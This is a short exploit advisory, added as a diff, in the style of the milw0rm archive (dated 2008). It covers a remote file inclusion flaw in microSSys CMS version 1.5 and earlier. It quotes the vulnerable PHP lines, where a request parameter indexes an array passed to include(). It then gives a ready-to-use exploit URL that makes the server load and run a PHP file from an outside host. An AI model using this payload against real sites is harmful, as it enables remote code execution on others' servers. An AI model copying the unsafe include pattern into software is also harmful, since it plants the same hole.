@@ -1,0 +1,20 @@
+## microSSys CMS <= 1.5 Remote File Inclusion Vulnerability
+## Software site: http://wajox.com/
+## ===============================================================
+##                   By Raz0r (www.Raz0r.name)
+## ===============================================================
+## Vulnerable code (index.php@22-25,54-55):
+## [22] if(isset($_REQUEST["1"])){
+## [23] $P=$_REQUEST["1"];}else{
+## [24] $P="main";
+## [25] }
+## [..]
+## [54] if(isset($PAGES[$P])){}else{include("TH.txt");}
+## [55] @include($PAGES[$P]);
+## Nice...
+## ===============================================================
+## Exploit:
+## http://host/index.php?1=lol&PAGES[lol]=http://raz0r.name/s.php
+## =============================================================== 
+
+# milw0rm.com [2008-05-19]
